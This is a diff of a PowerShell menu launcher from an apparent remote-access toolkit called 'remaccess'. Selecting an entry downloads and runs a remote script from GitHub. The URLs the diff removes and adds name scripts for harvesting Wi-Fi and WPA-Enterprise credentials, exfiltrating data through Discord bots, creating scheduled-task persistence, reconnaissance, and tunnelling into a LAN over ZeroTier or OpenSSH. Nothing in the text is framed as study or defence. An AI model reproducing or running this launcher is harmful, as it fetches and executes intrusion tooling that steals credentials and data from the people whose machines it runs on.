@@ -40,23 +40,14 @@ function Show-ActionMenu {
 }
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $actions = @(
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AutomatedTaskWithPingInstall.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PreampCoreDownload.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Archives/OpenSSHOldInstallFromZip.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/SearchDog.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ReconService.ps1",
-    "https://gist.githubusercontent.com/CybersamuraiDK/6e0be5c0c47165228895079efa8d98ec/raw/01f60731ba1602f5e8b45c2c3ed1532a5d4373d6/wifi-passwords.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordDataTransportBot.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordAutoDataReaperBots.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WifiPersistentDataReaper.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/TaskSchedulerServiceCreater.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTaskSchedulerCreator.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WPAEnterpriseCredentialsHarvester.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Aria2InstallForRemoteSystems.ps1",
-    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ZTPassthroughToLan.ps1"
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CoreFiles/GLforCoreFiles.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/GLforOpenSSHStuff.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/ZeroTierStuff/GLforZeroTier.ps1"
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/SupportFIles/GLforSupportFiles.ps1"
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/DiscordBots/GLforDiscordBots.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/WifiRelatedStuff/GLForWifiRelatedStuff.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/Archives/GLforArchives.ps1",
+    "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CleanUp.ps1"
 )
 # Call the function to display the action menu and execute the selected action or quit
 Show-ActionMenu -Actions $actions
